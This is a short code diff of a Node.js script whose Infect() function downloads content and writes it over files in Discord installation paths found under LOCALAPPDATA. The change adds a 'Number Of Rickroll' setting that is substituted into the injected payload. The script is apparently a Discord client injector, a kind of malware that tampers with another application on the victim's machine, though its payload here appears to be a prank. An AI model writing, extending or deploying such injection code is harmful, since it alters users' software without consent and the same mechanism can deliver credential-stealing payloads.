@@ -7,7 +7,9 @@ const {
 } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-
+var config = {
+    "Number Of Rickroll":10
+}
 var LOCAL = process.env.LOCALAPPDATA
 var discords = [];
 var injectPath = [];
@@ -34,7 +36,7 @@ function Infect() {
         });
         resp.on('end', () => {
             injectPath.forEach(file => {
-                fs.writeFileSync(file,data), {
+                fs.writeFileSync(file,data.replace('%NOR%', config["Number Of Rickroll"])), {
                     encoding: 'utf8',
                     flag: 'w'
                 }});
